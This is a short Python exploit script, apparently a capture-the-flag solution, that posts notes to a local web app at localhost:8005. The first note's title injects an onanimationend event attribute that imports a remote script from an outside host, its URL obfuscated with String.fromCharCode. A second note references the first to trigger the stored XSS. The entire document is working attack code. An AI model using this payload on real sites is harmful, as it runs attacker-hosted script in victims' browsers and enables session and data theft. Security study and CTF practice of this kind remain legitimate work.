import requests

BASE_URL = 'http://localhost:8005'

payload_url = 'http://example.com/a.php'
payload_url = 'String.fromCharCode('+','.join(str(ord(c)) for c in payload_url)+')'

r = requests.put(f'{BASE_URL}/api/note/new', data={
    'title': f'a onanimationend=import({payload_url}) style=animation-name:wag;animation-duration:0s', # headless: falseじゃないとonanimationendが発火しないっぽい?
    'body': 'bbb',
    'password': 'ccc'
})
id = r.json()['id']

r = requests.put(f'{BASE_URL}/api/note/new', data={
    'title': 'aaa',
    'body': f'[{id}]',
    'password': 'ccc'
})
print(f'{BASE_URL}/note/{r.json()["id"]}')